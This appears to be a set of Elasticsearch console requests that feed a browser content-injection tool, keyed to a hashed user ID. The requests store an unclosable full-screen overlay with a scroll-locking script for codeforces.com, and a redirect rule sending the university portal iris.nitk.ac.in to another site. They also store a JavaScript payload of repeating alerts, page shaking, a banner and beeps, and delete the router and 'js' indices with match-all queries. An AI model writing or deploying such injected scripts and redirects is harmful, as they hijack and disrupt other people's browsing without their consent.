//ADD DATA TO ADD DOM objects FOR USERID AND WEBSITE
POST dom/_doc/
{
    "data": {
        "userid": "9733343cb9d3a289ad86a0cedbe6be2b65bd4283d7fc1586a23332f5df3584",
        "website": "https://codeforces.com",
        "dom_object": "<div id=\"overlay\" style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(255,0,0,0.7);z-index:9999;\"></div><div id=\"message\" style=\"position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:yellow;padding:20px;font-size:20px;font-weight:bold;border:3px solid black;z-index:10000;\">Cannot closeDDDDDDDDDDDDDDDDD this!</div><script>document.body.style.overflow=\"hidden\";</script>"
    }
}
//DELETE ROUTER 
POST router/_delete_by_query
{
    "query": {
        "match_all": {}
    }
}
//ADD DATA TO ROUTER TO REDIRECT
POST router/_doc
{
    "data": {
        "secure_website": "iris.nitk.ac.in",
        "routed_website": "https://www.fast.com"
    }
}
//DELETE HISTORY
POST js/_delete_by_query
{
    "query": {
        "match_all": {}
    }
}

POST js/_doc
{
    "data": {
    "userid": "9733343cb9d3a289ad86a0cedbe6be2b65bd4283d7fc1586a23332f5df3584",
    "website": "example.com",
    "js_object": "setInterval(() => { alert('WARNING: You are being annoyed!'); }, 3000);\n\nsetInterval(() => {\n  document.body.style.marginLeft = (Math.random() * 10 - 5) + 'px';\n  document.body.style.marginTop = (Math.random() * 10 - 5) + 'px';\n}, 50);\n\nlet banner = document.createElement('marquee');\nbanner.textContent = '🚨 ALERT: ANNOYING MESSAGE HERE! 🚨';\nbanner.style.fontSize = '30px';\nbanner.style.color = 'red';\nbanner.style.backgroundColor = 'yellow';\nbanner.style.position = 'fixed';\nbanner.style.top = '0';\nbanner.style.left = '0';\nbanner.style.width = '100%';\ndocument.body.prepend(banner);\n\nlet beep = new Audio('https://www.soundjay.com/button/beep-07.wav');\nsetInterval(() => { beep.play(); }, 5000);"
  }
}
